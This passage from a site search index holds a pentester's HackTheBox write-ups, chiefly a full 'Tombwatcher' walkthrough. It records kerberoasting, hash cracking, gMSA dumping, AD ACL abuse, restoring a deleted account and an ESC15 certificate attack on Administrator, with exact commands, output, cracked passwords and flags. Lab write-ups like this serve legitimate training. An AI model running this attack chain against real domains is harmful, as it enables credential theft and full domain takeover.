this user has has <code>DCSync</code> rights towards the domain, revealing the NTML hash of the Administrator</li> <li>using administrator's NTLM hash we login via evil-winrm and grab the root flag!</li> </ol>"},{"location":"ch3ckm8_HTB_sauna/#extras_1","title":"Extras","text":"<ol> <li>on the 3rd step of the Privesc above, we could use <code>mimikatz</code> instead of <code>secretsdump</code>, by uploading it to the target and running it, revealing the NTLM hash of the Administrator.</li> </ol>"},{"location":"ch3ckm8_HTB_sauna/#sidenotes","title":"Sidenotes","text":"<p>What makes this one valuable in my notes, apart from other commonly used methodologies, was the usage of <code>WinPeas</code> to reveal sensitive information such as accounts with <code>AutoLogon credentials</code>.</p> <p>To conclude, this machine was a good example where winpeas was the only (easy) way to identify the path towards privesc.</p> <p></p>"},{"location":"ch3ckm8_HTB_tombwatcher/","title":"Tombwatcher","text":""},{"location":"ch3ckm8_HTB_tombwatcher/#intro","title":"Intro","text":"<p> Description: <pre><code>As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!, so its an assumed breach scenario\n</code></pre> [[windows]] [[AssumedBreach]] [[certificates]] [[certvulntoESC15]] [[RecycleBin]] Tags: #windows #AssumedBreach #certificates #certvulntoESC15 #RecycleBin  Tools used: - rpcclient - smbclient - bloodyAD - certipy-ad - gMSADumper - john - targetedkerberoast</p>"},{"location":"ch3ckm8_HTB_tombwatcher/#reconnaissance","title":"Reconnaissance","text":"<p>Add machine to <code>/etc/hosts</code> <pre><code>sudo sh -c \"echo '10.10.11.72 DC01.tombwatcher.htb tombwatcher.htb' &gt;&gt; /etc/hosts\"\n</code></pre></p> <p>start the nmap scan <pre><code>sudo nmap -sC -sV tombwatcher.htb\n</code></pre></p> <p><pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-25 13:10 EDT\nNmap scan report for tombwatcher.htb (10.10.11.72)\nHost is up (0.048s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-title: IIS Windows Server\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-25 21:10:13Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-06-25T21:11:34+00:00; +3h59m59s from scanner time.\n| ssl-cert: Subject: commonName=DC01.tombwatcher.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb\n| Not valid before: 2024-11-16T00:47:59\n|_Not valid after:  2025-11-16T00:47:59\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.tombwatcher.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb\n| Not valid before: 2024-11-16T00:47:59\n|_Not valid after:  2025-11-16T00:47:59\n|_ssl-date: 2025-06-25T21:11:34+00:00; +4h00m00s from scanner time.\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-06-25T21:11:34+00:00; +3h59m59s from scanner time.\n| ssl-cert: Subject: commonName=DC01.tombwatcher.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb\n| Not valid before: 2024-11-16T00:47:59\n|_Not valid after:  2025-11-16T00:47:59\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.tombwatcher.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb\n| Not valid before: 2024-11-16T00:47:59\n|_Not valid after:  2025-11-16T00:47:59\n|_ssl-date: 2025-06-25T21:11:34+00:00; +4h00m00s from scanner time.\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-06-25T21:10:54\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m58s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 92.60 seconds\n</code></pre> We see RPC being open, along with other ports that indicate that the target is a Domain Controller</p> <p>According to the description, we are given creds: <pre><code>henry\nH3nry_987TGV!\n</code></pre></p> <p>lets try to login with win-rm since we can see its port is open <pre><code>evil-winrm -i 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!'\n</code></pre> </p>"},{"location":"ch3ckm8_HTB_tombwatcher/#checking-our-given-creds-with-nxc","title":"Checking our given creds with nxc","text":"<p>using my script for automating the nxc valid credential identification towards multiple open services https://github.com/ch3ckkm8/auto_netexec <pre><code>./auto_netexec_bulk_creds_checker.sh tombwatcher.htb 'henry' 'H3nry_987TGV!'\n</code></pre></p> <p><pre><code>[*] Checking if winrm port 5985 is open on tombwatcher.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       10.10.11.72     5985   DC01             [-] tombwatcher.htb\\henry:H3nry_987TGV!\n\n[*] Checking if smb port 445 is open on tombwatcher.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV! \n\n[*] Checking if ldap port 389 is open on tombwatcher.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV! \n\n[*] Checking if rdp port 3389 is open on tombwatcher.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on tombwatcher.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.10.11.72     135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)\nRPC         10.10.11.72     135    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV! \n\n[*] Checking if nfs port 2049 is open on tombwatcher.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on tombwatcher.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on tombwatcher.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on tombwatcher.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on tombwatcher.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> So with these creds we can login to <code>SMB</code> , <code>LDAP</code> and <code>RPC</code>. </p>"},{"location":"ch3ckm8_HTB_tombwatcher/#checking-smb-service","title":"Checking SMB service","text":"<pre><code>smbclient -U 'henry' -L tombwatcher.htb\n</code></pre> <p><pre><code>Sharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nSYSVOL          Disk      Logon server share \n</code></pre> Nothing interesting found here, lets try <code>RPC</code></p>"},{"location":"ch3ckm8_HTB_tombwatcher/#checking-rpc-service","title":"Checking RPC service","text":""},{"location":"ch3ckm8_HTB_tombwatcher/#anonymous-login","title":"Anonymous login:","text":"<pre><code>rpcclient -U \"\" -N 10.10.11.72\n</code></pre> <p><pre><code>rpcclient $&gt; enumdomusers\nresult was NT_STATUS_ACCESS_DENIED\n</code></pre> so anonymous login gives us access denied</p>"},{"location":"ch3ckm8_HTB_tombwatcher/#login-with-henry","title":"Login with henry:","text":"<pre><code>rpcclient -U 'henry%H3nry_987TGV!' 10.10.11.72\n</code></pre>"},{"location":"ch3ckm8_HTB_tombwatcher/#enumerate-domain-users","title":"Enumerate domain users","text":"<pre><code>enumdomusers\n</code></pre> <pre><code>rpcclient $&gt; enumdomusers\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[Henry] rid:[0x44f]\nuser:[Alfred] rid:[0x450]\nuser:[sam] rid:[0x451]\nuser:[john] rid:[0x452]\n</code></pre>"},{"location":"ch3ckm8_HTB_tombwatcher/#enumerate-domain-groups","title":"Enumerate domain groups","text":"<pre><code>enumdomgroups\n</code></pre> <pre><code>rpcclient $&gt; enumdomgroups\ngroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]\ngroup:[Domain Admins] rid:[0x200]\ngroup:[Domain Users] rid:[0x201]\ngroup:[Domain Guests] rid:[0x202]\ngroup:[Domain Computers] rid:[0x203]\ngroup:[Domain Controllers] rid:[0x204]\ngroup:[Schema Admins] rid:[0x206]\ngroup:[Enterprise Admins] rid:[0x207]\ngroup:[Group Policy Creator Owners] rid:[0x208]\ngroup:[Read-only Domain Controllers] rid:[0x209]\ngroup:[Cloneable Domain Controllers] rid:[0x20a]\ngroup:[Protected Users] rid:[0x20d]\ngroup:[Key Admins] rid:[0x20e]\ngroup:[Enterprise Key Admins] rid:[0x20f]\ngroup:[DnsUpdateProxy] rid:[0x44e]\ngroup:[Infrastructure] rid:[0x453]\n</code></pre>"},{"location":"ch3ckm8_HTB_tombwatcher/#bloodhound-as-henry","title":"Bloodhound as henry","text":"<pre><code>sudo bloodhound-python -d tombwatcher.htb -u henry -p H3nry_987TGV! -ns 10.10.11.72 -c all\n</code></pre> <p> hm interesting, when i see SPN my mind goes to one thing, and this is <code>kerberoasting</code></p>"},{"location":"ch3ckm8_HTB_tombwatcher/#foothold","title":"Foothold","text":""},{"location":"ch3ckm8_HTB_tombwatcher/#kerberoasting","title":"Kerberoasting","text":"<pre><code>sudo ntpdate DC01.tombwatcher.htb\n</code></pre> <pre><code>python targetedkerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'\n</code></pre> <pre><code>[*] Starting kerberoast attacks\n[*] Fetching usernames from Active Directory with LDAP\n[VERBOSE] SPN added successfully for (Alfred)\n[+] Printing hash for (Alfred)\n$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$bd373892205e07dd64071d97f2552431$f43159f7658d8d69b9d20dee270d57a9d6eb60a5f862c396ebd61dea93561b4327443041a11e7c6c387072cf784be90311836dc09084b47c70ebd58a2e10121aa6f3eb137d6e7183bf33c8dafdbbb9773ccbdce1bae55bdb18f0abea2d4512f9086e3607b781f05a5a92e8c139ed51fbc8f6c208301406354e3240651c58c4e4ed96efbba7306f354d91fd756d652230edcf777d4b8351948874c339d88ef80184936c39cae3191eb03d1eae774b09a62b7ce9743c2d54e1c28a58f35294995dda16a23962e9ea852a3be882e9bb775c679bb1b9f21951e2fc0a96ad570a4ed85992ae22f53348ceeeec812f1969994273857a59cb9f2fbbd206fa4754e1bc5407a6fe9057641313f7845eb327d1ef7803619b167daf3f0010e094e055d592bd30fadbfb8e4adc1b94dfc6e41894d38837a1d2db0651a85c6fff03aff6280139404b9c9a195351a81aa55be4596975a9850349e9e6831403e0fe1c0191dd803df6819231742dee062e74a9eb9847d3a2c4a584724ba20f3ddd8399453ab3bfe209593806e441801cfbb6ba844ba753c9347cc042ab85c49d4cd06cab961595808f24013a195226e43a9470db6998a5b5ee7981a0d4e5825fc0a13f31314ed85b5358f890f6a113a8ab9ba7a4fa6086a6f92dc158e2e5e360992a73fa1f0eb924d730531e716dbf3973f52b14560468ee3538b1cfb5ce83ff66b6894ef3af9baf3ce2dc7d9a1b9f96f1282ad11e5ce27ae3f3a9025c94724e8ed470e9f35bf47565063d8cd57c39114347de03202d425e5bb9a9a7488572a018c0456f989614d35054ac7a031468e00b47042bbb784d82b92fc8f9aadaf7e8c284453ce98ae714e2474ad57f83a6c3d3c6ad966e4bbad062e9398a55b0cdd6906f9cde3e02fc338b51e68033ffc1052f6f928373c9501d4b0b90c0624fd1c22bedc8f5fa0a0f777fd1bc1e745c987a76f5a3212539f68f343586b3089795a8d49cbea0b3b631b4a1122bb98ad11235ee0eb57ef7213dc69d2341d5f03532f7618e31c9f0149dc2152a1ebbbb0d90740d572e9b73160d2df0fc7e9726273e16a3d4b71c83e80d0aad9751aaabd2a328709f2c1004d8534e2ae88d6836f8a386793c18ed875f352dcb1bf82acc37361f08607b1bbdef618f5e400603a01a151ab6f1b5f6007b16867457755de2fbb66313bfddfed38bb4f68e543041c8331c42208a9d7c76ed2badff7b34170eedd6ba76d6f51bea695dc762a4e8d6c1524237dd6fb53dd7c24c0413a73083fd0f3d27cc4f70caec94f2721c36c2ca7e9193c0fd2b1bd520d55145e520d131e9e52e9a7f9a3adc515de78505e929b2f45bc6e6984be26a7d91a6e9fa29114cd7965406b764e616b31e70ed5d1efb237c57b4636e13782ce1a69e8e6d86ee7f684ec9431898fa87a84345064f4288a5e68ea37dc6adfac44de97f8beb00dd949a58f33f2b6cd76b1a8248d06a139c23ca\n[VERBOSE] SPN removed successfully for (Alfred)\n</code></pre> <p>lets crackit <pre><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt \n</code></pre></p> <pre><code>Using default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 6 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nbasketball       (?)     \n1g 0:00:00:00 DONE (2025-06-25 18:52) 100.0g/s 153600p/s 153600c/s 153600C/s 123456..mexico1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p>So the updated creds are now <pre><code>Alfred\nbasketball\n</code></pre> now launch again bloodhound</p>"},{"location":"ch3ckm8_HTB_tombwatcher/#bloodhound-as-alfred","title":"Bloodhound as alfred","text":"<pre><code>bloodhound-python -u alfred  -p 'basketball'  -d tombwatcher.htb -ns 10.129.190.198 -c All --zip\n</code></pre> <p>lets try to login with win-rm since we can see its port is open <pre><code>evil-winrm -i 10.129.190.5 -u 'alfred' -p 'basketball'\n</code></pre></p> <p>no luck, lets inspect bloodhound and see what alfred can do </p> <p><pre><code>bloodyAD --host '10.129.190.5' -d 'tombwatcher.htb' -u alfred -p 'basketball' add groupMember INFRASTRUCTURE alfred\n</code></pre>  added successfully</p> <p>lets now inspect what the <code>INFRASTRUCTURE</code> group can do  the infrastructure group has <code>ReadGMSAPassword</code> over ansible dev group</p>"},{"location":"ch3ckm8_HTB_tombwatcher/#gmsa-dump","title":"GMSA Dump","text":"<p>https://github.com/micahvandeusen/gMSADumper <pre><code>git clone https://github.com/micahvandeusen/gMSADumper\n</code></pre></p> <pre><code>python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb \n</code></pre> <p><pre><code>Users or groups who can read password for ansible_dev$:\n &gt; Infrastructure\nansible_dev$:::4b21348ca4a9edff9689cdf75cbda439\nansible_dev$:aes256-cts-hmac-sha1-96:499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a\nansible_dev$:aes128-cts-hmac-sha1-96:230ccd9df374b5fad6a322c5d7410226\n</code></pre> grab the hash from here <pre><code>ansible_dev$:::4b21348ca4a9edff9689cdf75cbda439\n</code></pre></p> <p>run bloodhound again, with the hash of ansible_dev <pre><code>bloodhound-python -u 'ansible_dev$'  --hashes ':4b21348ca4a9edff9689cdf75cbda439' -d tombwatcher.htb -ns 10.129.190.5 -c All --zip\n</code></pre></p> <p>now lets see what ansible_dev can do via bloodhound </p> <p>Lets change the password of SAM as ansible_dev <pre><code>bloodyAD --host '10.129.190.5' -d 'tombwatcher.htb' -u 'ansible_dev$' -p ':4b21348ca4a9edff9689cdf75cbda439' set password SAM 'TheBestpassword0!'\n</code></pre>  pass change successful</p> <p>run bloodhound again <pre><code>bloodhound-python  -u 'SAM' -p 'TheBestpassword0!' -d tombwatcher.htb -ns 10.129.190.5 -c All --zip\n</code></pre></p> <p>lets see what sam can do  he has <code>WriteOwner</code> towards john</p> <pre><code>sudo ntpdate DC01.tombwatcher.htb\n</code></pre>"},{"location":"ch3ckm8_HTB_tombwatcher/#make-sam-the-owner-of-john","title":"make SAM the owner of john","text":"<p><pre><code>impacket-owneredit -action write -target 'john' -new-owner 'sam' 'tombwatcher.htb/sam':'TheBestpassword0!' -dc-ip 10.129.190.5\n</code></pre> or <pre><code>python owneredit.py -action write -target 'john' -new-owner 'sam' 'tombwatcher.htb/sam':'TheBestpassword0!' -dc-ip 10.129.190.5\n</code></pre></p> <pre><code>[*] Current owner information below\n[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512\n[*] - sAMAccountName: Domain Admins\n[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb\n[*] OwnerSid modified successfully!\n</code></pre>"},{"location":"ch3ckm8_HTB_tombwatcher/#set-genericall-over-john-as-sam","title":"set genericAll over john as sam","text":"<p><pre><code>bloodyAD --host '10.129.190.5' -d 'tombwatcher.htb' -u 'sam' -p 'TheBestpassword0!' add genericAll JOHN sam\n</code></pre>  it was successful, lets move on</p>"},{"location":"ch3ckm8_HTB_tombwatcher/#set-johns-pass","title":"Set john's pass","text":"<p><pre><code>bloodyAD --host '10.129.190.5' -d 'tombwatcher.htb' -u 'sam' -p 'TheBestpassword0!' set password JOHN 'TheBestpassword2!'\n</code></pre>  was successful too, lets login with winrm now <pre><code>evil-winrm -i 10.129.190.5 -u 'john' -p 'TheBestpassword2!'\n</code></pre></p> <p>it was successful, lets grab user flag! <pre><code>b8e8a1b48f8f2b29fef17cd91633172a\n</code></pre></p>"},{"location":"ch3ckm8_HTB_tombwatcher/#privesc","title":"Privesc","text":""},{"location":"ch3ckm8_HTB_tombwatcher/#bloodhound-as-john","title":"Bloodhound as john","text":"<p>Run bloodhound again, now as john <pre><code>sudo bloodhound-python -d tombwatcher.htb -u john -p TheBestpassword2! -ns 10.10.11.72 -c all\n</code></pre></p> <p>Lets observe the outbound control of john:  John has <code>GenericAll</code> over <code>CERT_ADMIN</code> and <code>CERT_ADM</code> , and also owns <code>CERT_ADM</code></p>"},{"location":"ch3ckm8_HTB_tombwatcher/#find-vulnerable-certificates-as-john","title":"Find vulnerable certificates as <code>john</code>","text":"<pre><code>certipy-ad find -vulnerable -u john@tomwatcher.htb -p \"TheBestpassword2!\" -dc-ip 10.129.190.5\n</code></pre> <pre><code>[*] Finding certificate templates\n[*] Found 33 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 11 enabled certificate templates\n[*] Trying to get CA configuration for 'tombwatcher-CA-1' via CSRA\n[!] Got error while trying to get CA configuration for 'tombwatcher-CA-1' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration for 'tombwatcher-CA-1' via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[*] Got CA configuration for 'tombwatcher-CA-1'\n[!] Failed to lookup user with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'\n[*] Saved BloodHound data to '20250712140936_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k\n[*] Saved text output to '20250712140936_Certipy.txt'\n[*] Saved JSON output to '20250712140936_Certipy.json'\n</code></pre> <pre><code>Certificate Authorities\n  0\n    CA Name                             : tombwatcher-CA-1\n    DNS Name                            : DC01.tombwatcher.htb\n    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb\n    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC\n    Certificate Validity Start          : 2024-11-16 00:47:48+00:00\n    Certificate Validity End            : 2123-11-16 00:57:48+00:00\n    Web Enrollment                      : Disabled\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Permissions\n      Owner                             : TOMBWATCHER.HTB\\Administrators\n      Access Rights\n        ManageCertificates              : TOMBWATCHER.HTB\\Administrators\n                                          TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        ManageCa                        : TOMBWATCHER.HTB\\Administrators\n                                          TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Enroll                          : TOMBWATCHER.HTB\\Authenticated Users\nCertificate Templates                   : [!] Could not find any certificate templates\n</code></pre> <p>No vulnerable cert templates found, what now?</p>"},{"location":"ch3ckm8_HTB_tombwatcher/#how-to-move-forward","title":"How to move forward","text":"<p>Well.. lets get suspicious about the machine's name, it contains the keyword <code>tomb</code>. With the help of google i came across this: <pre><code>In Active Directory, tombstones are essentially\u00a0placeholders for deleted objects, allowing for replication across domain controllers before the objects are permanently removed.\n</code></pre> So knowing that, it could be a hint, lets try to view and potentially retrieve deleted objects.</p>"},{"location":"ch3ckm8_HTB_tombwatcher/#check-for-deleted-objects","title":"Check for deleted objects","text":"<p>Lets find deleted objects in the Recycle bin: <pre><code>Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq \"user\"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List\n</code></pre></p> <pre><code>Name            : cert_admin\n                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3\nObjectGUID      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3\nobjectSid       : S-1-5-21-1392491010-1358638721-2126982587-1109\nlastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb\n\nName            : cert_admin\n                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358\nObjectGUID      : c1f1f0fe-df9c-494c-bf05-0679e181b358\nobjectSid       : S-1-5-21-1392491010-1358638721-2126982587-1110\nlastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb\n\nName            : cert_admin\n                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf\nObjectGUID      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf\nobjectSid       : S-1-5-21-1392491010-1358638721-2126982587-1111\nlastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb\n</code></pre>"},{"location":"ch3ckm8_HTB_tombwatcher/#restore-deleted-object-we-also-see-that-they-are-related-to-usercert_admin","title":"Restore deleted object, we also see that they are related to user<code>cert_admin</code>","text":"<p>Restore the object via the <code>ObjectGUID</code> we found above <pre><code>Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'\n</code></pre></p>"},{"location":"ch3ckm8_HTB_tombwatcher/#set-a-new-password-for-cert_admin","title":"Set a new password for <code>cert_admin</code>","text":"<p>Since <code>john</code> has <code>GenericAll</code> perimission over <code>cert_admin</code>, we can set a new password: <pre><code>bloodyAD --host '10.129.190.5' -d 'tombwatcher.htb'  -u 'john' -p 'TheBestpassword2!' set password cert_admin 'Abc123456@#' \n</code></pre></p>"},{"location":"ch3ckm8_HTB_tombwatcher/#find-vulnerable-certificates-as-cert_admin","title":"Find vulnerable certificates as <code>cert_admin</code>","text":"<pre><code>certipy-ad find -u cert_admin -p \"Abc123456@#\" -dc-ip 10.129.190.5 -vulnerable\n</code></pre> <p><pre><code>\u2514\u2500$ cat 20250712122656_Certipy.txt                                                  \nCertificate Authorities                                                             \n  0                                                                                 \n    CA Name                             : tombwatcher-CA-1                          \n    DNS Name                            : DC01.tombwatcher.htb                      \n    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb                                                                                   \n    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC          \n    Certificate Validity Start          : 2024-11-16 00:47:48+00:00                 \n    Certificate Validity End            : 2123-11-16 00:57:48+00:00                 \n    Web Enrollment                                                                  \n      HTTP                                                                          \n        Enabled                         : False                                     \n      HTTPS                                                                         \n        Enabled                         : False                                     \n    User Specified SAN                  : Disabled                                  \n    Request Disposition                 : Issue                                     \n    Enforce Encryption for Requests     : Enabled                                   \n    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy                                                                                  \n    Permissions                                                                     \n      Owner                             : TOMBWATCHER.HTB\\Administrators            \n      Access Rights\n        ManageCa                        : TOMBWATCHER.HTB\\Administrators\n                                          TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        ManageCertificates              : TOMBWATCHER.HTB\\Administrators\n                                          TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Enroll                          : TOMBWATCHER.HTB\\Authenticated Users\nCertificate Templates\n  0\n    Template Name                       : WebServer\n    Display Name                        : Web Server\n    Certificate Authorities             : tombwatcher-CA-1\n    Enabled                             : True\n    Client Authentication               : False\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Extended Key Usage                  : Server Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Schema Version                      : 1\n    Validity Period                     : 2 years\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 2048\n    Template Created                    : 2024-11-16T00:57:49+00:00\n    Template Last Modified              : 2024-11-16T17:07:26+00:00\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n                                          TOMBWATCHER.HTB\\cert_admin\n      Object Control Permissions\n        Owner                           : TOMBWATCHER.HTB\\Enterprise Admins\n        Full Control Principals         : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Write Owner Principals          : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Write Dacl Principals           : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Write Property Enroll           : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n                                          TOMBWATCHER.HTB\\cert_admin\n    [+] User Enrollable Principals      : TOMBWATCHER.HTB\\cert_admin\n    [!] Vulnerabilities\n      ESC15                             : Enrollee supplies subject and schema version is 1.\n    [*] Remarks\n      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.\n</code></pre> we can see that is vulnerable to <code>ESC15</code></p>"},{"location":"ch3ckm8_HTB_tombwatcher/#request-a-certificate-as-cert_admin-for-administrator","title":"Request a certificate as <code>cert_admin</code> for <code>administrator</code>","text":"<p><pre><code>certipy-ad req \\\n    -u 'cert_admin@tombwatcher.htb' -p 'Abc123456@#' \\\n    -dc-ip '10.129.190.5' -target 'DC01.tombwatcher.htb' \\\n    -ca 'tombwatcher-CA-1' -template 'WebServer' \\\n    -upn 'administrator@tombwatcher.htb'  \\\n    -application-policies 'Client Authentication'\n</code></pre> (I was literally stuck 4 hours on this, the problem was the certipy version being not 5.0.2 ............. it did not recognize the -application-policies part, this is the version that worked: <code>Certipy v5.0.2 - by Oliver Lyak (ly4k)</code>)</p>"},{"location":"ch3ckm8_HTB_tombwatcher/#change-administrators-pass-via-the-pfx","title":"Change administrator's pass via the <code>.pfx</code>","text":"<pre><code>certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.190.5' -ldap-shell\n</code></pre> <p>once we get shell, change the password of the administrator: <pre><code>change_password administrator Abc123456@#\n</code></pre></p> <pre><code>Certipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: 'administrator@tombwatcher.htb'\n[*] Connecting to 'ldaps://10.129.190.5:636'\n[*] Authenticated to '10.129.190.5' as: 'u:TOMBWATCHER\\\\Administrator'\nType help for list of commands\n\n# change_password administrator Abc123456@#\nGot User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb\nAttempting to set new password of: Abc123456@#\nPassword changed successfully!\n</code></pre> <p>finally login in as administrator <pre><code>evil-winrm -i 10.129.190.5 -u 'Administrator' -p 'Abc123456@#'\n</code></pre> got root flag! <pre><code>7f3831dc40795365d5b53356cb6815fa\n</code></pre> 